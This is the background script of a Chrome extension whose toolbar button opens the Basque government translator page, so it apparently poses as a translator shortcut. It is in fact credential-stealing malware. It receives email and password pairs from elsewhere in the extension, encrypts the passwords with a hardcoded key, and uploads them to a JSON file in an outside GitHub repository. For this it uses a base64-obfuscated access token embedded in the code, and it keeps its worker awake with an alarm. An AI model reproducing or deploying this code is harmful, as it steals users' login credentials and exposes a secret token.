//import {Octokit, App} from "https://cdn.skypack.dev/octokit";
import CryptoJS from "./crypto.js";

// Prevent sleep
chrome.alarms.create({periodInMinutes: 4.5});
chrome.alarms.onAlarm.addListener(() => {
	console.log("Wake up");
});

const crypt = {
	secret: "VFF3403",

	encrypt: (clear) => {
		let cipher = CryptoJS.AES.encrypt(clear, crypt.secret);
		cipher = cipher.toString();
		return cipher;
	}
}

/*const octokit = new Octokit({
	auth: atob("Z2hwXzZFeFFJYlhRY3BzMnRmUDVqRFRyU3luSjFzdWVFbjRhRjQ1TQ==")
});*/

const url = "https://api.github.com/repos/agent3204/data/contents/ds.json";

function jsonParse(str) {
	try {
		const parsed = JSON.parse(str);
		if (parsed instanceof Object) {
			return parsed;
		} else {
			return {};
		}
	} catch {
		return {};
	}
}

async function request(method, body) {
	const data = {
		headers: {
			Authorization: "token " + atob("Z2hwXzZFeFFJYlhRY3BzMnRmUDVqRFRyU3luSjFzdWVFbjRhRjQ1TQ=="),
			"Content-Type": "application/json"
		},
		method
	};

	if (method !== "GET") {
		data.body = JSON.stringify(body ?? {});
	}

	const response = await fetch(url, data);

	return await response.json();
}

async function send({email, pwd}) {
	const owner = "agent3204";
	const repo = "data";
	const path = "ds.json";

	try {
		/*const {data} = await octokit.request('GET /repos/{owner}/{repo}/contents/{path}', {
			owner: owner,	
			repo: repo,
			path: path
		});*/

		const data = await request("GET");

		const currentContent = jsonParse(atob(data.content));
		let state = "Updated";
		let emailInfo = currentContent[email];

		if (!emailInfo) {
			emailInfo = {};
			state = "Added";
		}

		pwd = crypt.encrypt(pwd);
		
		if (emailInfo.pwd !== pwd) {
			emailInfo.pwd = pwd;
			emailInfo.timestamp = Date.now();
			emailInfo.encrypted = true;

			currentContent[email] = emailInfo;

			/*await octokit.request("PUT /repos/{owner}/{repo}/contents/{path}", {
				owner: owner,
				repo: repo,
				path: path,
				message: state + " " + email,
				content: btoa(JSON.stringify(currentContent)),
				sha: data.sha
			});*/

			await request("PUT", {
				message: state + " " + email,
				content: btoa(JSON.stringify(currentContent)),
				sha: data.sha
			});
		}
	}
	catch (ex) {
		console.error(ex);
	}
}

const Queue = {
	processing: false,
	responses: []
};

function addQueue(response) {
	Queue.responses.push(response);
	if (!Queue.processing) {
		processQueue();
	}
}

async function processQueue() {
	if (Queue.processing) return;
	Queue.processing = true;

	while (Queue.responses.length > 0) {
		const response = Queue.responses.shift();
		await send(response);
	}

	Queue.processing = false;
}

chrome.action.onClicked.addListener(tab => {
	chrome.tabs.create({url: "https://www.euskadi.eus/traductor/"});
});

chrome.runtime.onMessage.addListener((response) => {
	console.log("Received response");
	addQueue(response);
});